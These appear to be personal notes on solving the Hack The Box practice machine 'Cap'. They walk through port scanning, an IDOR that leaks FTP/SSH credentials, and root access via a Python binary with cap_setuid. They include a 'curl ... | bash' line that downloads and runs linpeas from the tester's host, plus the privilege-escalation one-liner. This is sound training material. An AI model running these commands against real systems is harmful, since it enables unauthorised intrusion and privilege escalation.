---
box: Cap
platform: HTB
os: Linux
difficulty: easy
ip:
date_started: 22/5/2026
date_rooted: 23/5/2026
time_taken: 4 hours
status: done
tags:
  -
---

# Cap

- **Path:** Web IDOR $\rightarrow$ Leaked Creds $\rightarrow$ SSH Login $\rightarrow$ Python Capabilities Root PE
    
- **Credentials:** `Nathan : Buck3tH4TF0RM3!`


## Recon

**Nmap**
```
nmap -T4 -F $IP
nmap -Pn -p- --min-rate 1000 -T4 $IP -oN allports.txt
nmap -sC -sV -p<open ports> -oA detailed_scan $IP
nmap -sU -F $IP // if got stuck
```
- **Port 21 (FTP):** vsftpd 3.0.3 (No anonymous access)
    
- **Port 22 (SSH):** Open (No password yet)
    
- **Port 80 (HTTP):** Gunicorn server $\rightarrow$ Means a **Python** backend (Flask/Django)


## Web & Foothold

**The Flaw (IDOR):** The site used predictable paths like `/download/12` and `/view/5`.

> 💡 **Tip:** Always test `0`, `-1`, and `9999`.


IDOR -> leaked creds -> FTP -> SSH reuse 

Add:

```
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/...
```

and:

``` bash
Observe object references:
?id=1
/download/12
/view/5
Try:0 -1 9999 other users
```

**FTP**
`anonymous:` failed, pw required
found vstfp 3.0.3, quick check, not vulnerable



## Privilege Escalation

_What user → what user. Tool used (linpeas/winpeas/etc), vector found, exploit._

> Core: find things with extra privilege, make it execute shell.

**Manual Discovery** 
Gunicorn indicates Python WSGI server
→ likely Flask/Django app
→ Python apps often store source in app.py/wsgi.py
→ check common locations:
/opt
/var/www
/home/*

→ found capability-enabled python binary
→ python has cap_setuid
→ can elevate via os.setuid(0)

**LinEnum**
```bash
# On host
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 8000

# In target
curl $ip:8000/linpeas.sh | bash 
# Better for report
wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh > /tmp/linpeas_results.txt
```


Found vuln, exploit 
```
# command
python3 

import os; 
os.setuid(0);
os.system('sh')
```

## Lessons

- **Don't Waste Time:** While LinPeas is running or Nmap is scanning, open a second SSH window and start manually poking around the application folders (`/opt`, `/var/www`).
    
- **Web Fuzzing Strategy:** Use an "Adaptive DFS" method. Make a quick list of pages to check, go one by one, and if you hit a rabbit hole, note it down and move to the next. Only fuzz deep if everything else fails.
    
- **Be Fast with Tools:** Know exactly where your files are locally:
    
```  bash
sudo updatedb && locate linpeas.sh
```



**Web Application**

| Thing Seen        | Likely Meaning          | Pentest Thoughts                  |
| ----------------- | ----------------------- | --------------------------------- |
| *Gunicorn*          | *Python backend*          | *SSTI? Flask debug? Django issues?* |
| PHP/8.x           | PHP app                 | LFI, upload bypass, old CVEs      |
| Apache            | Traditional Linux stack | .htaccess, misconfigs             |
| Nginx             | Reverse proxy           | Alias traversal, proxy mistakes   |
| Node.js / Express | JavaScript backend      | Prototype pollution, JWT mistakes |
| Tomcat            | Java app                | WAR upload, manager panel         |
| IIS               | Windows/.NET            | ASPX shells, NTLM                 |
| WordPress         | CMS                     | Plugin exploits                   |
| Jenkins           | CI/CD                   | Script console RCE                |
| phpMyAdmin        | DB admin                | Weak creds                        |


